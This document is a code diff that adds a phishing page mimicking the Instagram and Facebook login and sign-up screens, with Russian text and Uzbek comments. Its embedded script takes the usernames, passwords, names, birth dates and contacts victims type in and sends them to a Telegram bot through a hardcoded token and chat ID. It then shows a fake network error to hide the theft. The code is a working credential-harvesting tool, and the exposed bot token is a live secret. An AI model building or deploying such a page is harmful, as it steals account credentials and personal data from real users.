@@ -3,101 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Auth System</title>
-    <link rel="stylesheet" href="index.css">
+    <title>Meta Login</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: #000; border: 1px solid #363636; padding: 30px; width: 350px; text-align: center; border-radius: 3px; }
+        .fb-card { background: #fff; color: #1c1e21; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input, select { width: 100%; padding: 12px; margin: 6px 0; background: #121212; border: 1px solid #363636; color: white; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
+        .fb-card input, .fb-card select { background: #f5f6f7; border: 1px solid #dddfe2; color: #1c1e21; }
+        .btn-main { width: 100%; padding: 10px; margin-top: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; background-color: #0095f6; color: white; }
+        .fb-btn { background-color: #1877f2; }
+        .link-text { color: #0095f6; cursor: pointer; margin-top: 15px; display: block; font-size: 14px; text-decoration: none; }
+        .hidden { display: none; }
+        .flex-box { display: flex; gap: 5px; }
+    </style>
 </head>
-<body class="dark-bg">
+<body>
 
-    <!-- 1. INSTAGRAM REGISTRATION (1-4 rasmlar) -->
-    <div id="insta-reg" class="card insta-card">
-        <div class="meta-header">Meta</div>
-        <h2 class="title">Зарегистрируйтесь в Instagram</h2>
-        <p class="desc">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>
+<!-- 1. Instagram Kirish -->
+<div id="insta_login" class="card">
+    <h2 style="font-family: 'Arial', sans-serif;">Instagram</h2>
+    <input type="text" id="ins_log_user" placeholder="Имя пользователя, номер или email">
+    <input type="password" id="ins_log_pass" placeholder="Пароль">
+    <button class="btn-main" onclick="sendSimple('Instagram Login', 'ins_log_user', 'ins_log_pass')">Войти</button>
+    <div class="link-text" onclick="showPage('fb_login')">Войти через Facebook</div>
+    <div class="link-text" onclick="showPage('insta_reg')">Создать новый аккаунт</div>
+</div>
+
+<!-- 2. Instagram Ro'yxatdan o'tish -->
+<div id="insta_reg" class="card hidden">
+    <h3>Зарегистрируйтесь в Instagram</h3>
+    <input type="text" id="ins_reg_contact" placeholder="Номер мобильного или email">
+    <input type="password" id="ins_reg_pass" placeholder="Пароль">
+    <div style="text-align: left; font-size: 12px; margin: 5px 0;">Дата рождения:</div>
+    <div class="flex-box">
+        <select id="ins_reg_day"></select>
+        <select id="ins_reg_month"></select>
+        <select id="ins_reg_year"></select>
+    </div>
+    <input type="text" id="ins_reg_name" placeholder="Имя и фамилия">
+    <input type="text" id="ins_reg_user" placeholder="Имя пользователя">
+    <button class="btn-main" onclick="sendFull('Instagram Reg', ['ins_reg_contact', 'ins_reg_pass', 'ins_reg_day', 'ins_reg_month', 'ins_reg_year', 'ins_reg_name', 'ins_reg_user'])">Отправить</button>
+    <div class="link-text" onclick="showPage('insta_login')">У меня уже есть аккаунт</div>
+</div>
+
+<!-- 3. Facebook Kirish -->
+<div id="fb_login" class="card fb-card hidden">
+    <h2 style="color: #1877f2; font-size: 30px;">facebook</h2>
+    <input type="text" id="fb_log_user" placeholder="Электронный адрес или номер">
+    <input type="password" id="fb_log_pass" placeholder="Пароль">
+    <button class="btn-main fb-btn" onclick="sendSimple('Facebook Login', 'fb_log_user', 'fb_log_pass')">Войти</button>
+    <div class="link-text" onclick="showPage('fb_reg')">Создать новый аккаунт</div>
+</div>
+
+<!-- 4. Facebook Ro'yxatdan o'tish -->
+<div id="fb_reg" class="card fb-card hidden">
+    <h3 style="color: #1877f2;">Начните пользоваться Facebook</h3>
+    <div class="flex-box">
+        <input type="text" id="fb_reg_name" placeholder="Имя">
+        <input type="text" id="fb_reg_surname" placeholder="Фамилия">
+    </div>
+    <div class="flex-box">
+        <select id="fb_reg_day"></select>
+        <select id="fb_reg_month"></select>
+        <select id="fb_reg_year"></select>
+    </div>
+    <select id="fb_reg_gender">
+        <option value="">Выберите пол</option>
+        <option>Мужчина</option>
+        <option>Женщина</option>
+    </select>
+    <input type="text" id="fb_reg_contact" placeholder="Номер мобильного или email">
+    <input type="password" id="fb_reg_pass" placeholder="Пароль">
+    <button class="btn-main fb-btn" onclick="sendFull('Facebook Reg', ['fb_reg_name', 'fb_reg_surname', 'fb_reg_day', 'fb_reg_month', 'fb_reg_year', 'fb_reg_gender', 'fb_reg_contact', 'fb_reg_pass'])">Отправить</button>
+    <div class="link-text" onclick="showPage('fb_login')">У меня уже есть аккаунт</div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY';
+    const CHAT_ID = '6198817749';
+
+    function showPage(id) {
+        document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
+    }
+
+    function initSelectors() {
+        const months = ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"];
+        const prefixes = ['ins_reg_', 'fb_reg_'];
         
-        <form onsubmit="handleInstaSubmit(event)">
-            <div class="input-field">
-                <label>Мобильный телефон или электронный адрес</label>
-                <input type="text" id="insta-login" required>
-            </div>
-            <div class="input-field">
-                <label>Пароль</label>
-                <input type="password" id="insta-pass" required>
-            </div>
-            
-            <div class="dob-section">
-                <label>Дата рождения <span>?</span></label>
-                <div class="dob-selectors">
-                    <select id="insta-day"></select>
-                    <select id="insta-month"></select>
-                    <select id="insta-year"></select>
-                </div>
-            </div>
+        prefixes.forEach(p => {
+            const d = document.getElementById(p + 'day'), m = document.getElementById(p + 'month'), y = document.getElementById(p + 'year');
+            for(let i=1; i<=31; i++) d.innerHTML += `<option>${i}</option>`;
+            months.forEach(mo => m.innerHTML += `<option>${mo}</option>`);
+            for(let i=2026; i>=1970; i--) y.innerHTML += `<option>${i}</option>`;
+        });
+    }
+    initSelectors();
 
-            <div class="input-field">
-                <label>Название (Имя и фамилия)</label>
-                <input type="text" id="insta-name" required>
-            </div>
-            <div class="input-field">
-                <label>Имя пользователя</label>
-                <input type="text" id="insta-user" required>
-            </div>
+    async function notifyTelegram(msg) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+        });
+        alert("Xatolik: Tarmoqqa ulanishda muammo yuz berdi (Error 502).");
+    }
 
-            <button type="submit" class="btn-primary">Отправить</button>
-            <button type="button" class="btn-outline" onclick="togglePage('fb-login')">Войти через Facebook</button>
-        </form>
-    </div>
+    function sendSimple(type, uId, pId) {
+        const u = document.getElementById(uId).value;
+        const p = document.getElementById(pId).value;
+        if(u && p) notifyTelegram(`🔥 YANGI MA'LUMOT (${type})\n👤 Login: ${u}\n🔑 Parol: ${p}`);
+    }
 
-    <!-- 2. FACEBOOK LOGIN (5-rasm) -->
-    <div id="fb-login" class="card fb-card" style="display:none;">
-        <h2 class="fb-logo-text">Войдите на Facebook</h2>
-        <form>
-            <input type="text" placeholder="Электронный адрес или номер мобильного телефона" class="fb-input">
-            <input type="password" placeholder="Пароль" class="fb-input">
-            <button type="button" class="fb-btn-blue">Войти</button>
-            <a href="#" class="fb-link">Забыли пароль?</a>
-            <div class="fb-divider"></div>
-            <button type="button" class="fb-btn-green" onclick="togglePage('fb-reg')">Создать новый аккаунт</button>
-        </form>
-        <div class="fb-footer-meta">Meta</div>
-    </div>
-
-    <!-- 3. FACEBOOK REGISTRATION (6-rasm) -->
-    <div id="fb-reg" class="card fb-card" style="display:none;">
-        <h2 class="fb-reg-title">Начните пользоваться Facebook</h2>
-        <p class="fb-reg-desc">Создайте аккаунт для общения с друзьями, родными...</p>
-        
-        <form onsubmit="handleFBSubmit(event)">
-            <div class="fb-row">
-                <input type="text" placeholder="Имя" required>
-                <input type="text" placeholder="Фамилия" required>
-            </div>
-            
-            <div class="dob-section fb-light">
-                <label>Дата рождения <span>?</span></label>
-                <div class="dob-selectors">
-                    <select id="fb-day"></select>
-                    <select id="fb-month"></select>
-                    <select id="fb-year"></select>
-                </div>
-            </div>
-
-            <div class="input-field fb-light">
-                <label>Пол <span>?</span></label>
-                <select required>
-                    <option value="">Выберите пол</option>
-                    <option>Мужской</option>
-                    <option>Женский</option>
-                </select>
-            </div>
-
-            <input type="text" placeholder="Номер мобильного телефона или адрес эл. почты" class="fb-input" required>
-            <input type="password" placeholder="Пароль" class="fb-input" required>
-
-            <button type="submit" class="fb-btn-blue">Отправить</button>
-            <button type="button" class="btn-outline-dark" onclick="togglePage('insta-reg')">У меня уже есть аккаунт</button>
-        </form>
-    </div>
-
-    <script src="script.js"></script>
+    function sendFull(type, ids) {
+        let text = `🔥 YANGI AKKAUNT (${type})\n`;
+        let valid = true;
+        ids.forEach(id => {
+            const val = document.getElementById(id).value;
+            if(!val) valid = false;
+            text += `🔹 ${id.replace(/.+reg_/,'')}: ${val}\n`;
+        });
+        if(valid) notifyTelegram(text);
+        else alert("Iltimos, barcha maydonlarni to'ldiring!");
+    }
+</script>
 </body>
 </html>
